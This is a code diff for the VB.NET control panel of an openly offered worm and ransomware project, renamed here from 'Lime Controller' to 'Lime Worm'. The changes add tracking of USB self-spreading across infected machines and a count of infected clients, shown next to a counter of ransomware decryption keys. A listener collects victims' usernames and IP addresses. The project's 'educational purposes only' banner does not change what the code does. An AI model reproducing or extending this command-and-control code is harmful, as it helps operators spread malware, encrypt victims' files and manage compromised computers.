@@ -19,14 +19,14 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                 .. Lime Controller v0.4.1 ..                 ##
+'##                     .. Lime Worm v0.4.1 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
 '##################################################################
 '##    This project was created for educational purposes only    ##
 '##################################################################
-'##       https://github.com/NYAN-x-CAT/Lime-Controller/         ##
+'##           https://github.com/NYAN-x-CAT/Lime-Worm            ##
 '##################################################################
 '##  This software's main purpose is NOT to be used maliciously  ##
 '##################################################################
@@ -58,7 +58,7 @@ Public Class Form1
         Control.CheckForIllegalCrossThreadCalls = False
 
         Try
-            MYPORT = InputBox("Select Port", "", My.Settings.port)
+            MYPORT = InputBox("Hello " + Environment.UserName + " , Select Port", "", My.Settings.port)
             If Not MYPORT = Nothing Then
                 S = New Listner(MYPORT)
                 My.Settings.port = MYPORT
@@ -68,12 +68,7 @@ Public Class Form1
             End
         End Try
 
-        Try
-            Messages("Connection", "Established!")
-        Catch ex As Exception
-        End Try
-
-        Me.Text = "Lime Controller v0.4.1B"
+        Me.Text = "Lime Worm v0.4.1B"
 
     End Sub
 #End Region
@@ -116,10 +111,9 @@ Public Class Form1
                         Fix()
                     End SyncLock
 
-
                     NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
                     NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + u.IP
-                    NotifyIcon1.BalloonTipTitle = "Lime Controller | New Connection!"
+                    NotifyIcon1.BalloonTipTitle = "Lime Worm | New Connection!"
                     NotifyIcon1.ShowBalloonTip(600)
 
                 Case "ping" ' ping
@@ -131,7 +125,18 @@ Public Class Form1
 
                 Case "!R"
                     SyncLock L1.Items
-                        L1.Items(u.IP).SubItems(5).Text = A(1).ToString
+                        L1.Items(u.IP).SubItems(Rans.Index).Text = A(1).ToString
+                    End SyncLock
+                    Fix()
+
+                Case "!U"
+                    SyncLock L1.Items
+                        If A(1).ToString.Contains("Spreaded!") Then
+                            L1.Items(u.IP).BackColor = Color.DarkGreen
+                            L1.Items(u.IP).SubItems(USB.Index).Text = "Just Spreaded!"
+                        Else
+                            L1.Items(u.IP).SubItems(USB.Index).Text = A(1).ToString
+                        End If
                     End SyncLock
                     Fix()
 
@@ -264,7 +269,7 @@ Public Class Form1
 #End Region
 
 
-#Region "Controller Options"
+#Region "Worm Options"
 
 
     Private Sub DiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DiskToolStripMenuItem.Click
@@ -333,7 +338,7 @@ Public Class Form1
 
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
         Try
-            ToolStripStatusLabel1.Text = "LISTENING PORT [" & MYPORT & "]        ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        AVAILABLE KEYS TO DECRYPT [" & KeyCount() & "]"
+            ToolStripStatusLabel1.Text = "LISTENING PORT [" & MYPORT & "]        ONLINE CLIENTS [" & L1.Items.Count & "]        SELECTED CLIENTS [" & L1.SelectedItems.Count & "]        AVAILABLE KEYS TO DECRYPT [" & KeyCount() & "]        TOTAL USB SPREAD [" & SpreadCount() & "]"
         Catch ex As Exception
         End Try
     End Sub
@@ -350,6 +355,21 @@ Public Class Form1
             Return "0"
         End Try
     End Function
+
+    Public Function SpreadCount()
+        Try
+            Dim count As Integer = 0
+            For Each x As ListViewItem In L1.Items
+                If x.SubItems(USB.Index).Text.Contains("Spreaded!") Then
+                    count += 1
+                End If
+            Next
+            Return count
+        Catch ex As Exception
+            Return "0"
+        End Try
+    End Function
+
 
     Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
         Try
@@ -500,7 +520,7 @@ Public Class Form1
     End Sub
 
     Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click
-        MsgBox("Coded by NYAN CAT" + vbNewLine + vbNewLine + "r3vo@protonmail.com" + vbNewLine, MsgBoxStyle.Information, Title:=" Lime Controller | About ")
+        MsgBox("Coded by NYAN CAT" + vbNewLine + vbNewLine + "r3vo@protonmail.com" + vbNewLine, MsgBoxStyle.Information, Title:=" Lime Worm | About ")
     End Sub
 
     Private Sub BotColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BotColorToolStripMenuItem.Click
